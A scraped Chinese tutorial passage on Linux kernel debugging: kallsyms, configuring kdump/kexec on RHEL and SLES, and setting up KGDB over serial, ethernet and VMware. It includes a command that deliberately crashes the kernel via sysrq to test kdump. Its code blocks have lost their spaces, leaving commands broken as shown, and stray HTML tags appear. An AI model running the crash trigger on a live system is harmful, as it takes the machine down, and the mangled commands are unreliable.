style="vertical-align:baseline;">开发版2.5内核引入了kallsyms特性，它可以通过定义CONFIG_KALLSYMS编译选项启用。该选项可以载入内核镜像所对应的内存地址的符号名称（即函数名），所以内核可以打印解码之后的跟踪线索。相应，解码OOPS也不再需要System.map和ksymoops工具了。另外，</span><br> <span style="vertical-align:baseline;">这样做，会使内核变大些，因为地址对应符号名称必须始终驻留在内核所在内存上。</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`#cat/proc/kallsymsc0100240T_stextc0100240trun_init_processc0100240Tstextc0100269tinit…`</pre> <p><span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_27"></span></p><h4 id="3-Kdump"><a href="#3-Kdump" class="headerlink" title="3 Kdump"></a>3 Kdump</h4><p>3.1 Kdump 的基本概念</p><p>3.1.1 什么是 kexec ？</p><p>Kexec 是实现 kdump 机制的关键，它包括 2 个组成部分：一是内核空间的系统调用 kexec_load，负责在生产内核（production kernel 或 first kernel）启动时将捕获内核（capture kernel 或 sencond kernel）加载到指定地址。二是用户空间的工具 kexec-tools，他将捕获内核的地址传递给生产内核，从而在系统崩溃的时候能够找到捕获内核的地址并运行。没有 kexec 就没有 kdump。先有 kexec 实现了在一个内核中可以启动另一个内核，才让 kdump 有了用武之地。kexec 原来的目的是为了节省 kernel 开发人员重启系统的时间，谁能想到这个“偷懒”的技术却孕育了最成功的内存转存机制呢？</p><p>3.1.2 什么是 kdump ？</p><p>Kdump 的概念出现在 2005 左右，是迄今为止最可靠的内核转存机制，已经被主要的 linux™ 厂商选用。kdump是一种先进的基于 kexec 的内核崩溃转储机制。当系统崩溃时，kdump 使用 kexec 启动到第二个内核。第二个内核通常叫做捕获内核，以很小内存启动以捕获转储镜像。第一个内核保留了内存的一部分给第二内核启动用。由于 kdump 利用 kexec 启动捕获内核，绕过了 BIOS，所以第一个内核的内存得以保留。这是内核崩溃转储的本质。</p><p>kdump 需要两个不同目的的内核，生产内核和捕获内核。生产内核是捕获内核服务的对像。捕获内核会在生产内核崩溃时启动起来，与相应的 ramdisk 一起组建一个微环境，用以对生产内核下的内存进行收集和转存。</p><p>3.1.3 如何使用 kdump</p><p>构建系统和 dump-capture 内核，此操作有 2 种方式可选：</p><p>1）构建一个单独的自定义转储捕获内核以捕获内核转储；</p><p>2） 或者将系统内核本身作为转储捕获内核，这就不需要构建一个单独的转储捕获内核。</p><p>方法（2）只能用于可支持可重定位内核的体系结构上；目前 i386，x86_64，ppc64 和 ia64 体系结构支持可重定位内核。构建一个可重定位内核使得不需要构建第二个内核就可以捕获转储。但是可能有时想构建一个自定义转储捕获内核以满足特定要求。</p><p>3.1.4 如何访问捕获内存</p><p>在内核崩溃之前所有关于核心映像的必要信息都用 ELF 格式编码并存储在保留的内存区域中。ELF 头所在的物理地址被作为命令行参数（fcorehdr=）传递给新启动的转储内核。</p><p>在 i386 体系结构上，启动的时候需要使用物理内存开始的 640K，而不管操作系统内核转载在何处。因此，这个640K 的区域在重新启动第二个内核的时候由 kexec 备份。</p><p>在第二个内核中，“前一个系统的内存”可以通过两种方式访问：</p><p>1） 通过 /dev/oldmem 这个设备接口。</p><p>一个“捕捉”设备可以使用“raw”（裸的）方式 “读”这个设备文件并写出到文件。这是关于内存的 “裸”的数据转储，同时这些分析 / 捕捉工具应该足够“智能”从而可以知道从哪里可以得到正确的信息。ELF 文件头（通过命令行参数传递过来的 elfcorehdr）可能会有帮助。</p><p>2） 通过 /proc/vmcore。</p><p>这个方式是将转储输出为一个 ELF 格式的文件，并且可以使用一些文件拷贝命令（比如 cp，scp 等）将信息读出来。同时，gdb 可以在得到的转储文件上做一些调试（有限的）。这种方式保证了内存中的页面都以正确的途径被保存 ( 注意内存开始的 640K 被重新映射了 )。</p><p>3.1.5 kdump 的优势</p><p>1）高可靠性</p><p>崩溃转储数据可从一个新启动内核的上下文中获取，而不是从已经崩溃内核的上下文。</p><p>2） 多版本支持</p><p>LKCD(Linux Kernel Crash Dump)，netdump，diskdump 已被纳入 LDPs(Linux Documen-tation Project) 内核。SUSE 和 RedHat 都对 kdump 有技术支持。</p><p>3.2 Kdump 实现流程</p><p><img src="http://static.oschina.net/uploads/img/201303/13095818_2Eau.jpg" alt="图 1\. RHEL6.2 执行流程"><span style="font-family:Simsun;font-size:medium;line-height:normal;background-color:#FFFFFF;"></span> </p><p><span style="line-height:normal;">          </span><span style="line-height:1.5;font-size:10pt;">图 1. RHEL6.2 执行流程</span><span style="line-height:1.5;font-size:10pt;"></span> </p><p><img src="http://static.oschina.net/uploads/img/201303/13095819_vtjb.jpg" alt="图 2\. sles11 执行流程"><span style="font-family:Simsun;font-size:medium;line-height:normal;background-color:#FFFFFF;"></span> </p><pre><code>图 2\. sles11 执行流程</code></pre><p>3.3 配置 kdump</p><p>3.3.1 安装软件包和实用程序</p><p>Kdump 用到的各种工具都在 kexec-tools 中。kernel-debuginfo 则是用来分析 vmcore 文件。从 rhel5 开始，kexec-tools 已被默认安装在发行版。而 novell 也在 sles10 发行版中把 kdump 集成进来。所以如果使用的是rhel5 和 sles10 之后的发行版，那就省去了安装 kexec-tools 的步骤。而如果需要调试 kdump 生成的 vmcore文件，则需要手动安装 kernel-debuginfo 包。检查安装包操作：</p><pre class="displaycode">`3.3.2参数相关设置uli13lp1:/#rpm-qa|grepkexeckexec-tools-2.0.0-53.43.10uli13lp1:/#rpm-qa'kernel*debuginfo*'kernel-default-debuginfo-3.0.13-0.27.1kernel-ppc64-debuginfo-3.0.13-0.27.1`</pre> <p><span style="line-height:1.5;font-size:10pt;">系统内核设置选项和转储捕获内核配置选择在《使用 Crash 工具分析 Linux dump 文件》一文中已有说明，在此不再赘述。仅列出内核引导参数设置以及配置文件设置。</span> </p><p>1） 修改内核引导参数，为启动捕获内核预留内存</p><p>通过下面的方法来配置 kdump 使用的内存大小。添加启动参数”crashkernel=Y@X”，这里，Y 是为 kdump 捕捉内核保留的内存，X 是保留部分内存的开始位置。</p></problemlineabove></jfs_mount+0x291></chksuper></jfs_mount></pre></=512;i++){></stdio.h></stdlib.h></pre></config_log_buf_shift)`<></pre></li><li><p>对于 i386 和 x86_64, 编辑 /etc/grub.conf, 在内核行的最后添加”crashkernel=128M” 。</p></li><li><p>对于 ppc64，在 /etc/yaboot.conf 最后添加”crashkernel=128M”。 </p><p>在 ia64, 编辑 /etc/elilo.conf，添加”crashkernel=256M”到内核行。</p><p>2） kdump 配置文件</p><p>kdump 的配置文件是 /etc/kdump.conf（RHEL6.2）；/etc/sysconfig/kdump(SLES11 sp2)。每个文件头部都有选项说明，可以根据使用需求设置相应的选项。</p><p>3.3.3 启动 kdump 服务</p><p>在设置了预留内存后，需要重启机器，否则 kdump 是不可使用的。启动 kdump 服务：</p><p>Rhel6.2：</p><pre class="displaycode">`#chkconfigkdumpon#servicekdumpstatusKdumpisoperational#servicekdumpstart`</pre> <p>SLES11SP2：</p><pre class="displaycode">`#chkconfigboot.kdumpon#serviceboot.kdumpstart`</pre> <p>3.3.4 测试配置是否有效</p><p>可以通过 kexec 加载内核镜像，让系统准备好去捕获一个崩溃时产生的 vmcore。可以通过 sysrq 强制系统崩溃。</p><pre class="displaycode">`#echoc>/proc/sysrq-trigger`</pre> <p>这造成内核崩溃，如配置有效，系统将重启进入 kdump 内核，当系统进程进入到启动 kdump 服务的点时，vmcore 将会拷贝到你在 kdump 配置文件中设置的位置。RHEL 的缺省目录是 : /var/crash；SLES 的缺省目录是 : /var/log/dump。然后系统重启进入到正常的内核。一旦回复到正常的内核，就可以在上述的目录下发现 vmcore 文件，即内存转储文件。可以使用之前安装的 kernel-debuginfo 中的 crash 工具来进行分析（crash 的更多详细用法将在本系列后面的文章中有介绍）。</p><pre class="displaycode">`#crash/usr/lib/debug/lib/modules/2.6.17-1.2621.el5/vmlinux/var/crash/2006-08-23-15:34/vmcorecrash>bt`</pre> <p>3.4 载入“转储捕获”内核</p><p>需要引导系统内核时，可使用如下步骤和命令载入“转储捕获”内核：</p><pre class="displaycode">`kexec-p<dump-capture-kernel>\--initrd=<initrd-for-dump-capture-kernel>--args-linux\--append="root=<root-dev>init1irqpoll"`</root-dev></initrd-for-dump-capture-kernel></dump-capture-kernel></pre> <p>装载转储捕捉内核的注意事项：</p></li><li><p>转储捕捉内核应当是一个 vmlinux 格式的映像（即是一个未压缩的 ELF 映像文件），而不能是 bzImage 格式；</p></li><li>默认情况下，ELF 文件头采用 ELF64 格式存储以支持那些拥有超过 4GB 内存的系统。但是可以指定“–elf32-core-headers”标志以强制使用 ELF32 格式的 ELF 文件头。这个标志是有必要注意的，一个重要的原因就是：当前版本的 GDB 不能在一个 32 位系统上打开一个使用 ELF64 格式的 vmcore 文件。ELF32 格式的文件头不能使用在一个“没有物理地址扩展”（non-PAE）的系统上（即：少于 4GB 内存的系统）;</li><li>一个“irqpoll”的启动参数可以减低由于在“转储捕获内核”中使用了“共享中断”技术而导致出现驱动初始化失败这种情况发生的概率 ;</li><li><p>必须指定 <root-dev>，指定的格式是和要使用根设备的名字。具体可以查看 mount 命令的输出；“init 1”这个命令将启动“转储捕捉内核”到一个没有网络支持的单用户模式。如果你希望有网络支持，那么使用“init 3”。 </root-dev></p><p>3.5 后记</p><p>Kdump 是一个强大的、灵活的内核转储机制，能够在生产内核上下文中执行捕获内核是非常有价值的。本文仅介绍在 RHEL6.2 和 SLES11 中如何配置 kdump。望抛砖引玉，对阅读本文的读者有益。</p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span style="vertical-align:baseline;">参考：</span> </p><p>1 <span style="color:#1155CC;vertical-align:baseline;"><a href="http://linux.chinaunix.net/jh/4/1013999.html" target="_blank" rel="noopener">kallsyms的分析</a></span><br> 2  <a href="http://www.ibm.com/developerworks/cn/linux/l-cn-kdump1/index.html" target="_blank" rel="noopener">深入探索 Kdump</a> </p><h4 id="-3"><a href="#-3" class="headerlink" title=""></a><span style="vertical-align:baseline;"></span></h4><p>  </p><p><span id="OSC_h3_28"></span></p><h3 id="九-KGDB"><a href="#九-KGDB" class="headerlink" title="九 KGDB"></a><span style="vertical-align:baseline;">九 KGDB</span></h3><p><span style="vertical-align:baseline;">kgdb提供了一种使用 gdb调试 Linux 内核的机制。使用KGDB可以象调试普通的应用程序那样，在内核中进行设置断点、检查变量值、单步跟踪程序运行等操作。使用KGDB调试时需要两台机器，一台作为开发机（Development Machine）,另一台作为目标机（Target Machine），两台机器之间通过串口或者以太网口相连。串口连接线是一根RS-232接口的电缆，在其内部两端的第2脚（TXD）与第3脚（RXD）交叉相连，第7脚（接地脚）直接相连。调试过程中，被调试的内核运行在目标机上，gdb调试器运行在开发机上。</span><br> <span style="vertical-align:baseline;">目前，kgdb发布支持i386、x86_64、32-bit PPC、SPARC等几种体系结构的调试器。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_29"></span></p><h4 id="1-kgdb的调试原理"><a href="#1-kgdb的调试原理" class="headerlink" title="1 kgdb的调试原理"></a><span style="vertical-align:baseline;">1 kgdb的调试原理</span></h4><p><span style="vertical-align:baseline;">安装kgdb调试环境需要为Linux内核应用kgdb补丁，补丁实现的gdb远程调试所需要的功能包括命令处理、陷阱处理及串口通讯3个主要的部分。kgdb补丁的主要作用是在Linux内核中添加了一个调试Stub。调试Stub是Linux内核中的一小段代码，提供了运行gdb的开发机和所调试内核之间的一个媒介。gdb和调试stub之间通过gdb串行协议进行通讯。gdb串行协议是一种基于消息的ASCII码协议，包含了各种调试命令。当设置断点时，kgdb负责在设置断点的指令前增加一条trap指令，当执行到断点时控制权就转移到调试stub中去。此时，调试stub的任务就是使用远程串行通信协议将当前环境传送给gdb，然后从gdb处接受命令。gdb命令告诉stub下一步该做什么，当stub收到继续执行的命令时，将恢复程序的运行环境，把对CPU的控制权重新交还给内核</span> <img src="http://static.oschina.net/uploads/img/201303/12162607_r9Pn.jpg" alt=""> <span style="font-size:16px;font-family:'Times New Roman';background-color:#FFFFFF;vertical-align:baseline;"> </span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_30"></span></p><h4 id="2-Kgdb的安装与设置"><a href="#2-Kgdb的安装与设置" class="headerlink" title="2 Kgdb的安装与设置"></a><span style="vertical-align:baseline;">2 Kgdb的安装与设置</span></h4><p><span style="vertical-align:baseline;">下面我们将以Linux 2.6.7内核为例详细介绍kgdb调试环境的建立过程。</span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span style="vertical-align:baseline;">2.1 软硬件准备</span> </p><p><span style="vertical-align:baseline;">以下软硬件配置取自笔者进行试验的系统配置情况：</span> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span> <img src="http://static.oschina.net/uploads/img/201303/12162608_geFn.jpg" alt=""> <span style="font-size:16px;font-family:'Times New Roman';background-color:#FFFFFF;vertical-align:baseline;"> </span><br> <span style="vertical-align:baseline;">kgdb补丁的版本遵循如下命名模式：Linux-A-kgdb-B，其中A表示Linux的内核版本号，B为kgdb的版本号。以试验使用的kgdb补丁为例，linux内核的版本为linux-2.6.7，补丁版本为kgdb-2.2。</span><br> <span style="vertical-align:baseline;">物理连接好串口线后，使用以下命令来测试两台机器之间串口连接情况，stty命令可以对串口参数进行设置：</span><br> <span style="vertical-align:baseline;">在development机上执行：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`sttyispeed115200ospeed115200-F/dev/ttyS0`</pre> <p><span style="vertical-align:baseline;">在target机上执行：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`sttyispeed115200ospeed115200-F/dev/ttyS0`</pre> <p><span style="vertical-align:baseline;">在developement机上执行：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`echohello>/dev/ttyS0`</pre> <p><span style="vertical-align:baseline;">在target机上执行：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`cat/dev/ttyS0`</pre> <p><span style="vertical-align:baseline;">如果串口连接没问题的话在将在target机的屏幕上显示”hello”。</span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span style="vertical-align:baseline;">2.2 安装与配置</span> </p><p><span style="vertical-align:baseline;">下面我们需要应用kgdb补丁到Linux内核，设置内核选项并编译内核。这方面的资料相对较少，笔者这里给出详细的介绍。下面的工作在开发机（developement）上进行，以上面介绍的试验环境为例，某些具体步骤在实际的环境中可能要做适当的改动：</span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span style="vertical-align:baseline;">I、内核的配置与编译</span> </p><p><span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#tar-jxvflinux-2.6.7.tar.bz2[root@lisltmp]#tar-jxvflinux-2.6.7-kgdb-2.2.tar.tar[root@lisltmp]#cdinux-2.6.7`</pre> <p><span style="vertical-align:baseline;">请参照目录补丁包中文件README给出的说明，执行对应体系结构的补丁程序。由于试验在i386体系结构上完成，所以只需要安装一下补丁：core-lite.patch、i386-lite.patch、8250.patch、eth.patch、core.patch、i386.patch。应用补丁文件时，请遵循kgdb软件包内series文件所指定的顺序，否则可能会带来预想不到的问题。eth.patch文件是选择以太网口作为调试的连接端口时需要运用的补丁。</span><br> <span style="vertical-align:baseline;">应用补丁的命令如下所示：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#patch-p1<.. linux-2.6.7-kgdb-2.2="" core-lite.patch`<="" pre=""> <p><span style="vertical-align:baseline;">如果内核正确，那么应用补丁时应该不会出现任何问题（不会产生*.rej文件）。为Linux内核添加了补丁之后，需要进行内核的配置。内核的配置可以按照你的习惯选择配置Linux内核的任意一种方式。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#makemenuconfig`</pre> <p><span style="vertical-align:baseline;">在内核配置菜单的Kernel hacking选项中选择kgdb调试项，例如：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[*]KGDB:kerneldebuggingwithremotegdbMethodforKGDBcommunication(KGDB:Ongenericserialport(8250))--->[*]KGDB:Threadanalysis[*]KGDB:Consolemessagesthroughgdb[root@lisltmp]#make`</pre> <p><span style="vertical-align:baseline;">编译内核之前请注意Linux目录下Makefile中的优化选项，默认的Linux内核的编译都以-O2的优化级别进行。在这个优化级别之下，编译器要对内核中的某些代码的执行顺序进行改动，所以在调试时会出现程序运行与代码顺序不一致的情况。可以把Makefile中的-O2选项改为-O,但不可去掉-O，否则编译会出问题。为了使编译后的内核带有调试信息，注意在编译内核的时候需要加上-g选项。</span><br> <span style="vertical-align:baseline;">不过，当选择”Kernel debugging-&gt;Compile the kernel with debug info”选项后配置系统将自动打开调试选项。另外，选择”kernel debugging with remote gdb”后，配置系统将自动打开”Compile the kernel with debug info”选项。</span><br> <span style="vertical-align:baseline;">内核编译完成后，使用scp命令进行将相关文件拷贝到target机上(当然也可以使用其它的网络工具，如rcp)。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#scparch/i386/boot/bzImageroot@192.168.6.13:/boot/vmlinuz-2.6.7-kgdb[root@lisltmp]#scpSystem.maproot@192.168.6.13:/boot/System.map-2.6.7-kgdb`</pre> <p><span style="vertical-align:baseline;">如果系统启动使所需要的某些设备驱动没有编译进内核的情况下，那么还需要执行如下操作：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#mkinitrd/boot/initrd-2.6.7-kgdb2.6.7[root@lisltmp]#scpinitrd-2.6.7-kgdbroot@192.168.6.13:/boot/initrd-2.6.7-kgdb`</pre> <p><span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">II、kgdb的启动</span><br> <span style="vertical-align:baseline;">在将编译出的内核拷贝的到target机器之后，需要配置系统引导程序，加入内核的启动选项。以下是kgdb内核引导参数的说明：</span><br> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span> <img src="http://static.oschina.net/uploads/img/201303/12162609_GxMC.jpg" alt=""> <span style="font-size:16px;font-family:'Times New Roman';background-color:#FFFFFF;vertical-align:baseline;"> </span><br> <span style="vertical-align:baseline;">如表中所述，在kgdb 2.0版本之后内核的引导参数已经与以前的版本有所不同。使用grub引导程序时，直接将kgdb参数作为内核vmlinuz的引导参数。下面给出引导器的配置示例。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`title2.6.7kgdbroot(hd0,0)kernel/boot/vmlinuz-2.6.7-kgdbroroot=/dev/hda1kgdbwaitkgdb8250=1,115200`</pre> <p><span style="vertical-align:baseline;">在使用lilo作为引导程序时，需要把kgdb参放在由append修饰的语句中。下面给出使用lilo作为引导器时的配置示例。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`image=/boot/vmlinuz-2.6.7-kgdblabel=kgdbread-onlyroot=/dev/hda3append="gdbgdbttyS=1gdbbaud=115200"`</pre> <p><span style="vertical-align:baseline;">保存好以上配置后重新启动计算机，选择启动带调试信息的内核，内核将在短暂的运行后在创建init内核线程之前停下来，打印出以下信息，并等待开发机的连接。</span><br> <span style="vertical-align:baseline;">Waiting for connection from remote gdb…</span><br> <span style="vertical-align:baseline;">在开发机上执行：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`gdbfilevmlinuxsetremotebaud115200targetremote/dev/ttyS0`</pre> <p><span style="vertical-align:baseline;">其中vmlinux是指向源代码目录下编译出来的Linux内核文件的链接，它是没有经过压缩的内核文件，gdb程序从该文件中得到各种符号地址信息。</span><br> <span style="vertical-align:baseline;">这样，就与目标机上的kgdb调试接口建立了联系。一旦建立联接之后，对Linux内的调试工作与对普通的运用程序的调试就没有什么区别了。任何时候都可以通过键入ctrl+c打断目标机的执行，进行具体的调试工作。</span><br> <span style="vertical-align:baseline;">在kgdb 2.0之前的版本中，编译内核后在arch/i386/kernel目录下还会生成可执行文件gdbstart。将该文件拷贝到target机器的/boot目录下，此时无需更改内核的启动配置文件，直接使用命令：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lislboot]#gdbstart-s115200-t/dev/ttyS0`</pre> <p><span style="vertical-align:baseline;">可以在KGDB内核引导启动完成后建立开发机与目标机之间的调试联系。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">2.3 通过网络接口进行调试</span><br> <span style="vertical-align:baseline;">kgdb也支持使用以太网接口作为调试器的连接端口。在对Linux内核应用补丁包时，需应用eth.patch补丁文件。配置内核时在Kernel hacking中选择kgdb调试项，配置kgdb调试端口为以太网接口，例如：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[*]KGDB:kerneldebuggingwithremotegdbMethodforKGDBcommunication(KGDB:Onethernet)--->()KGDB:Ongenericserialport(8250)(X)KGDB:Onethernet`</pre> <p><span style="vertical-align:baseline;">另外使用eth0网口作为调试端口时，grub.list的配置如下：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`title2.6.7kgdbroot(hd0,0)kernel/boot/vmlinuz-2.6.7-kgdbroroot=/dev/hda1kgdbwaitkgdboe=@192.168.5.13/,@192.168.6.13/`</pre> <p><span style="vertical-align:baseline;">其他的过程与使用串口作为连接端口时的设置过程相同。</span><br> <span style="vertical-align:baseline;">注意：尽管可以使用以太网口作为kgdb的调试端口，使用串口作为连接端口更加简单易行，kgdb项目组推荐使用串口作为调试端口。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">2.4 模块的调试方法</span><br> <span style="vertical-align:baseline;">内核可加载模块的调试具有其特殊性。由于内核模块中各段的地址是在模块加载进内核的时候才最终确定的，所以develop机的gdb无法得到各种符号地址信息。所以，使用kgdb调试模块所需要解决的一个问题是，需要通过某种方法获得可加载模块的最终加载地址信息，并把这些信息加入到gdb环境中。</span><br> <span style="vertical-align:baseline;">I、在Linux 2.4内核中的内核模块调试方法</span><br> <span style="vertical-align:baseline;">在Linux2.4.x内核中，可以使用insmod -m命令输出模块的加载信息，例如：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#insmod-mhello.ko>modaddr`</pre> <p><span style="vertical-align:baseline;">查看模块加载信息文件modaddr如下：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`.this00000060c88d80002**2.text00000035c88d80602**2.rodata00000069c88d80a02**5…….data00000000c88d833c2**2.bss00000000c88d833c2**2……`</pre> <p><span style="vertical-align:baseline;">在这些信息中，我们关心的只有4个段的地址:.text、.rodata、.data、.bss。在development机上将以上地址信息加入到gdb中,这样就可以进行模块功能的测试了。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`(gdb)Add-symbol-filehello.o0xc88d8060-s.data0xc88d80a0-s.rodata0xc88d80a0-s.bss0xc88d833c`</pre> <p><span style="vertical-align:baseline;">这种方法也存在一定的不足，它不能调试模块初始化的代码，因为此时模块初始化代码已经执行过了。而如果不执行模块的加载又无法获得模块插入地址，更不可能在模块初始化之前设置断点了。对于这种调试要求可以采用以下替代方法。</span><br> <span style="vertical-align:baseline;">在target机上用上述方法得到模块加载的地址信息，然后再用rmmod卸载模块。在development机上将得到的模块地址信息导入到gdb环境中，在内核代码的调用初始化代码之前设置断点。这样，在target机上再次插入模块时，代码将在执行模块初始化之前停下来，这样就可以使用gdb命令调试模块初始化代码了。</span><br> <span style="vertical-align:baseline;">另外一种调试模块初始化函数的方法是：当插入内核模块时，内核模块机制将调用函数sys_init_module(kernel/modle.c)执行对内核模块的初始化，该函数将调用所插入模块的初始化函数。程序代码片断如下：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`…………if(mod->init!=NULL)ret=mod->init();…………`</pre> <p><span style="vertical-align:baseline;">在该语句上设置断点，也能在执行模块初始化之前停下来。</span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span style="vertical-align:baseline;">II、在Linux 2.6.x内核中的内核模块调试方法</span> </p><p><span style="vertical-align:baseline;">Linux 2.6之后的内核中，由于module-init-tools工具的更改，insmod命令不再支持-m参数，只有采取其他的方法来获取模块加载到内核的地址。通过分析ELF文件格式，我们知道程序中各段的意义如下：</span><br> <span style="vertical-align:baseline;">.text（代码段）：用来存放可执行文件的操作指令，也就是说是它是可执行程序在内存种的镜像。</span><br> <span style="vertical-align:baseline;">.data（数据段）：数据段用来存放可执行文件中已初始化全局变量，也就是存放程序静态分配的变量和全局变量。</span><br> <span style="vertical-align:baseline;">.bss（BSS段）：BSS段包含了程序中未初始化全局变量，在内存中 bss段全部置零。</span><br> <span style="vertical-align:baseline;">.rodata（只读段）：该段保存着只读数据，在进程映象中构造不可写的段。</span><br> <span style="vertical-align:baseline;">通过在模块初始化函数中放置一下代码，我们可以很容易地获得模块加载到内存中的地址。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`……intbss_var;staticinthello_init(void){printk(KERN_ALERT"Textlocation.text(CodeSegment):%p\n",hello_init);staticintdata_var=0;printk(KERN_ALERT"DataLocation.data(DataSegment):%p\n",&data_var);printk(KERN_ALERT"BSSLocation:.bss(BSSSegment):%p\n",&bss_var);……}Module_init(hello_init);`</pre> <p><span style="vertical-align:baseline;">这里，通过在模块的初始化函数中添加一段简单的程序，使模块在加载时打印出在内核中的加载地址。.rodata段的地址可以通过执行命令readelf -e hello.ko，取得.rodata在文件中的偏移量并加上段的align值得出。</span><br> <span style="vertical-align:baseline;">为了使读者能够更好地进行模块的调试，kgdb项目还发布了一些脚本程序能够自动探测模块的插入并自动更新gdb中模块的符号信息。这些脚本程序的工作原理与前面解释的工作过程相似，更多的信息请阅读参考资料[4]。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">2.5 硬件断点</span><br> <span style="vertical-align:baseline;">kgdb提供对硬件调试寄存器的支持。在kgdb中可以设置三种硬件断点：执行断点（Execution Breakpoint）、写断点（Write Breakpoint）、访问断点（Access Breakpoint）但不支持I/O访问的断点。 目前，kgdb对硬件断点的支持是通过宏来实现的，最多可以设置4个硬件断点，这些宏的用法如下：</span><br> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span> <img src="http://static.oschina.net/uploads/img/201303/12162610_ODYA.jpg" alt=""> <span style="font-size:16px;font-family:'Times New Roman';background-color:#FFFFFF;vertical-align:baseline;"> </span><br> <span style="vertical-align:baseline;">在有些情况下，硬件断点的使用对于内核的调试是非常方便的。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_31"></span></p><h4 id="3-在VMware中搭建调试环境"><a href="#3-在VMware中搭建调试环境" class="headerlink" title="3 在VMware中搭建调试环境"></a><span style="vertical-align:baseline;">3 在VMware中搭建调试环境</span></h4><p><span style="vertical-align:baseline;">kgdb调试环境需要使用两台微机分别充当development机和target机，使用VMware后我们只使用一台计算机就可以顺利完成kgdb调试环境的搭建。以windows下的环境为例，创建两台虚拟机，一台作为开发机，一台作为目标机。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">3.1 虚拟机之间的串口连接</span><br> <span style="vertical-align:baseline;">虚拟机中的串口连接可以采用两种方法。一种是指定虚拟机的串口连接到实际的COM上，例如开发机连接到COM1，目标机连接到COM2，然后把两个串口通过串口线相连接。另一种更为简便的方法是：在较高一些版本的VMware中都支持把串口映射到命名管道，把两个虚拟机的串口映射到同一个命名管道。例如，在两个虚拟机中都选定同一个命名管道 \.\pipe\com_1,指定target机的COM口为server端，并选择”The other end is a virtual machine”属性；指定development机的COM口端为client端，同样指定COM口的”The other end is a virtual machine”属性。对于IO mode属性，在target上选中”Yield CPU on poll”复选择框，development机不选。这样，可以无需附加任何硬件，利用虚拟机就可以搭建kgdb调试环境。 即降低了使用kgdb进行调试的硬件要求，也简化了建立调试环境的过程。</span><br> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span> <img src="http://static.oschina.net/uploads/img/201303/12162610_WfIP.jpg" alt=""> <span style="font-size:16px;font-family:'Times New Roman';background-color:#FFFFFF;vertical-align:baseline;"> </span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span style="vertical-align:baseline;">3.2 VMware的使用技巧</span> </p><p><span style="vertical-align:baseline;">VMware虚拟机是比较占用资源的，尤其是象上面那样在Windows中使用两台虚拟机。因此，最好为系统配备512M以上的内存，每台虚拟机至少分配128M的内存。这样的硬件要求，对目前主流配置的PC而言并不是过高的要求。出于系统性能的考虑，在VMware中尽量使用字符界面进行调试工作。同时，Linux系统默认情况下开启了sshd服务，建议使用SecureCRT登陆到Linux进行操作，这样可以有较好的用户使用界面。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">3.3 在Linux下的虚拟机中使用kgdb</span><br> <span 